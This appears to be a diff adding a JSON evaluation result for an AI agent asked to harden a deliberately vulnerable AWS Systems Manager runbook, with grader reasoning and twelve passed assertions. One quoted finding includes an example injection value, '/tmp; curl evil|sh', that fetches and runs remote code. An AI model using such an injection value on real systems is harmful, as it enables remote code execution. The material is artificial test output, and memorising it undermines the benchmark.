@@ -1,0 +1,132 @@
+{
+  "version": "v1",
+  "iteration": 1,
+  "eval_id": "auto-harden-vulnerable",
+  "run_type": "with_skill",
+  "success": true,
+  "error": null,
+  "understanding_agent_space_skill": null,
+  "tests": {
+    "trigger": {
+      "result": "passed",
+      "message": "Skill 'aws-systems-manager' was triggered as expected",
+      "skill_loads_found": 1
+    },
+    "expected_output": {
+      "result": "passed",
+      "reasoning": "The agent's response covers all required findings: (1) command injection via LogPath with weak '.*' pattern flagged Critical and fixed with anchored pattern + quoting; (2) DbPassword SecureString invalid parameter type flagged and fixed, plus the echoed password flagged as Critical and removed without repeating the value; (3) missing allowedPattern on InstanceId flagged High and fixed with instance ID regex; (4) curl -k disabling TLS verification flagged High and fixed by removing -k; (5) hard-coded assumeRole ARN flagged High and fixed by parameterizing to {{AutomationAssumeRole}}; (6) timeoutSeconds 1200 flagged Medium and lowered to 600; (7) onCancel: step:Wait pointing to an aws:sleep step flagged Medium and fixed to Abort; (8) onFailure: Continue on RotateLogs listed as an informational/confirmation item, not a hard finding, matching the expected output's instruction to list it 'as information'. The agent also returns a complete hardened YAML document with all the required changes (anchored LogPath pattern, instance ID pattern, Parameter Store name parameter DbPasswordParameterName, -k removed, assumeRole parameterized, timeout 600, onCancel fixed), and each change is cited with a source. This substantively matches the expected output criteria.",
+      "evidence": "\"**`LogPath` (check 3, Critical):** I replaced the pattern `.*` with an anchored pattern...\" ; \"**PROPOSED FIX: Remove the secret from command text (check 2, Critical)** ... `AFTER:` `echo \\\"restarting app service\\\"` with a `String` parameter `DbPasswordParameterName`...\" ; \"**`InstanceId` (check 3, High):** It had no validation. I added `^i-(?:[a-f0-9]{8}|[a-f0-9]{17})$`.\" ; \"**PROPOSED FIX: Turn TLS verification back on (check 9, High)** ... `curl -k` skips certificate validation...\" ; \"**PROPOSED FIX: Make the assume role a parameter (check 4, High)** ... `assumeRole: '{{AutomationAssumeRole}}'`\" ; \"**`CheckHealth.timeoutSeconds` (check 5, Medium):** I lowered 1200 to 600...\" ; \"**PROPOSED FIX: Route `onCancel` to a valid target (check 6, Medium)** ... `AFTER:` `onCancel: Abort`\" ; \"**`RotateLogs` has `onFailure: Continue`.** If `tar` or the notify call fails, the runbook still runs `CheckHealth` and reports success. Confirm that's what you want.\"",
+      "confidence": "high"
+    },
+    "assertions": {
+      "assertion_results": [
+        {
+          "text": "Flags LogPath as a command-injection risk because its pattern is '.*' and it is interpolated into a shell command",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "Applied fixes section: \"LogPath (check 3, Critical): I replaced the pattern .* with an anchored pattern that allows only paths under /var/log/ and rejects .., quotes, spaces and shell metacharacters.\" and PROPOSED FIX: Quote LogPath in the shell command (check 1, Critical) explicitly states 'LogPath goes straight into tar and rm -rf. With the old .* pattern, a value like /tmp; curl evil|sh or / runs arbitrary or destructive commands as root on the instance.'",
+          "reasoning": "The agent explicitly identifies the .* pattern as a command injection risk due to shell interpolation.",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags SecureString as an invalid parameter type and recommends taking the Parameter Store parameter name instead",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "\"DbPassword type (check 10, Low): SecureString isn't a valid document parameter type, so this document likely can't be created as written. I changed it to a String that holds a Parameter Store parameter name (see the secrets fix below).\"",
+          "reasoning": "Directly matches the assertion.",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags the echo of DbPassword as exposing a secret",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "\"Remove the secret from command text (check 2, Critical) - Issue: echo \\\"restarting with password {{DbPassword}}\\\" writes the password in clear text into the Run Command history, the command output and the execution parameters.\"",
+          "reasoning": "Clearly flags the echo as exposing a secret.",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags curl -k as disabling TLS verification",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "\"Turn TLS verification back on (check 9, High) - Issue: curl -k skips certificate validation, so the notify call can be intercepted or spoofed.\"",
+          "reasoning": "Directly matches assertion.",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags the hard-coded assumeRole ARN",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "\"Make the assume role a parameter (check 4, High) - Issue: A hard-coded AppOpsRole ARN ties the runbook to one account.\"",
+          "reasoning": "Directly flags hard-coded assumeRole.",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags timeoutSeconds 1200 as above the aws:executeScript maximum of 600 seconds",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "\"CheckHealth.timeoutSeconds (check 5, Medium): I lowered 1200 to 600, the documented maximum for aws:executeScript.\"",
+          "reasoning": "Matches assertion exactly.",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags onCancel routing to an aws:sleep step as invalid",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "\"Route onCancel to a valid target (check 6, Medium) - Issue: onCancel: step:Wait points at an aws:sleep step, which can't be a cancel target.\"",
+          "reasoning": "Directly flags invalid onCancel target.",
+          "confidence": "high"
+        },
+        {
+          "text": "Returns a complete hardened document in YAML",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "The output contains a full 'Hardened document' code block with schemaVersion, description, assumeRole, parameters, and mainSteps sections fully filled out in YAML.",
+          "reasoning": "A complete hardened YAML document is provided at the end of the response.",
+          "confidence": "high"
+        },
+        {
+          "text": "Cites a documentation page for findings",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "Multiple findings include a 'Source:' line, e.g. \"Source: Schemas, 'Parameter security best practices'.\" and \"Source: the aws:executeScript action page.\" and \"Source: Data protection; Security best practices; Parameter Store in Run Command.\"",
+          "reasoning": "The agent cites documentation-like sources for most findings, though these are generic/short names rather than full links; still satisfies the assertion that documentation is cited.",
+          "confidence": "medium"
+        },
+        {
+          "text": "The instance ID pattern is applied",
+          "evaluator": "regex",
+          "passed": true,
+          "evidence": "Matched 'i-(?:[a-f0-9]{8}'"
+        },
+        {
+          "text": "The executeScript timeout is lowered to 600",
+          "evaluator": "regex",
+          "passed": true,
+          "evidence": "Matched 'timeoutSeconds: 600'"
+        },
+        {
+          "text": "No raw 12-digit account ID other than the documentation example is exposed",
+          "evaluator": "regex",
+          "passed": true,
+          "evidence": "Pattern not found in the output"
+        }
+      ],
+      "summary": {
+        "passed": 12,
+        "failed": 0,
+        "errored": 0,
+        "low_confidence": 0,
+        "total": 12,
+        "pass_rate": 1.0
+      }
+    }
+  },
+  "metrics": {
+    "runtime": "59s",
+    "cost": "$0.50",
+    "context_window": {
+      "utilization": "5.7%",
+      "compaction_count": 0
+    }
+  }
+}
